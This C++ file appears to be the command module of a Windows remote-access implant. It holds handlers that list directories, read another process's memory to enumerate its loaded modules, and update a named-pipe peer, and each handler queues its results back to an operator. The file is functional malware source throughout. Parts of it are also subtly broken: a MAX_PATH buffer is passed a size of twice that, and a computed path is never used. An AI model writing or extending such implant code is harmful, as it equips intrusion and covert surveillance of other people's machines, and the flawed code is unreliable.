#include <core/include/commands.hpp>
namespace Commands {

    VOID DirectoryList (PPARSER Parser) {
        HEXANE

        PSTREAM Outbound          = Stream::CreateStreamWithHeaders(TypeResponse);
        ULONG PathSize          = { };
        CHAR Path[MAX_PATH]     = { };

        INT Counter             = { };
        HANDLE File             = { };
        WIN32_FIND_DATAA Next   = { };
        ULARGE_INTEGER FileSize = { };
        SYSTEMTIME FileTime     = { };
        SYSTEMTIME SysTime      = { };

        Stream::PackDword(Outbound, CommandDir);

        if ((B_PTR(Parser->Handle))[0] == PERIOD) {
            if (!(PathSize = Ctx->win32.GetCurrentDirectoryA(MAX_PATH * 2, Path))) {
                return_defer(ERROR_DIRECTORY);
            }

            if (Path[PathSize - 1] != BSLASH) {
                Path[PathSize++] = BSLASH;
            }

            Path[PathSize++]  = ASTER;
            Path[PathSize]    = NULTERM;
        }

        if ((File = Ctx->win32.FindFirstFileA(Parser::UnpackString(Parser, nullptr), &Next)) == INVALID_HANDLE_VALUE) {
            return_defer(ERROR_FILE_NOT_FOUND);
        }

        do {
            if(
                !Ctx->win32.FileTimeToSystemTime(&Next.ftLastAccessTime, &FileTime) ||
                !Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &FileTime, &SysTime)) {
                return_defer(ERROR_INVALID_TIME);
            }

            if (Next.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                Stream::PackBool(Outbound, TRUE);

            } else {
                FileSize.HighPart   = Next.nFileSizeHigh;
                FileSize.LowPart    = Next.nFileSizeLow;

                Stream::PackBool(Outbound, FALSE);
                Stream::PackDword64(Outbound, FileSize.QuadPart);
            }

            Stream::PackDword(Outbound, FileTime.wDay);
            Stream::PackDword(Outbound, FileTime.wMonth);
            Stream::PackDword(Outbound, FileTime.wYear);
            Stream::PackDword(Outbound, SysTime.wSecond);
            Stream::PackDword(Outbound, SysTime.wMinute);
            Stream::PackDword(Outbound, SysTime.wHour);
            Stream::PackString(Outbound, Next.cFileName);

            Counter++;

        } while (Ctx->win32.FindNextFileA(File, &Next) != 0);

        Message::OutboundQueue(Outbound);
        defer:

        if (File) {
            Ctx->win32.FindClose(File);
        }
    }

    VOID ProcessModules (PPARSER Parser) {
        HEXANE

        PSTREAM Outbound                  = Stream::CreateStreamWithHeaders(TypeResponse);
        PPEB_LDR_DATA LdrData           = { };
        PROCESS_BASIC_INFORMATION pbi   = { };
        HANDLE Process                  = { };
        ULONG Pid                       = { };

        PLIST_ENTRY Head 	            = { };
        PLIST_ENTRY Entry               = { };
        LDR_DATA_TABLE_ENTRY cMod       = { };

        CHAR ModNameA[MAX_PATH] 		= { };
        WCHAR ModNameW[MAX_PATH] 	    = { };

        INT counter = 0;
        SIZE_T size = 0;

        Stream::PackDword(Outbound, CommandMods);

        if (
            !(Pid       = Process::GetProcessIdByName(S_PTR(Parser->Handle))) ||
            !(Process   = Process::NtOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, Pid))) {
            return_defer(ERROR_PROCESS_IS_PROTECTED);
        }

        if (NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(Process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr)) ) {

            if (
                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, &pbi.PebBaseAddress->Ldr, &LdrData, sizeof(PPEB_LDR_DATA), &size)) ||
                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, &LdrData->InMemoryOrderModuleList.Flink, &Entry, sizeof(PLIST_ENTRY), nullptr))) {
                return_defer(ntstatus);
            }

            Head = &LdrData->InMemoryOrderModuleList;
            while (Entry != Head) {

                if (
                    !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, CONTAINING_RECORD(Entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &cMod, sizeof(LDR_DATA_TABLE_ENTRY), nullptr)) ||
                    !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, cMod.FullDllName.Buffer, &ModNameW, cMod.FullDllName.Length, &size)) || size != cMod.FullDllName.Length) {
                    return_defer(ntstatus);
                }

                if (cMod.FullDllName.Length > 0) {
                    size = x_wcstombs(ModNameA, ModNameW, cMod.FullDllName.Length);

                    Stream::PackString(Outbound, ModNameA);
                    Stream::PackDword64(Outbound, U64(cMod.DllBase));
                    counter++;
                }

                x_memset(ModNameW, 0, MAX_PATH);
                x_memset(ModNameA, 0, MAX_PATH);

                Entry = cMod.InMemoryOrderLinks.Flink;
            }
        }

        Message::OutboundQueue(Outbound);
        defer:
    }

    VOID Shutdown (PPARSER Parser) {
        HEXANE

        // Send final message
        // Zero/Free all memory
        // Exit
        ntstatus = ERROR_FATAL_APP_EXIT;
    }

    VOID UpdatePeer(PPARSER Parser) {
        HEXANE

        Parser::ParserWcscpy(Parser, &Ctx->Config.IngressPipename);
    }
}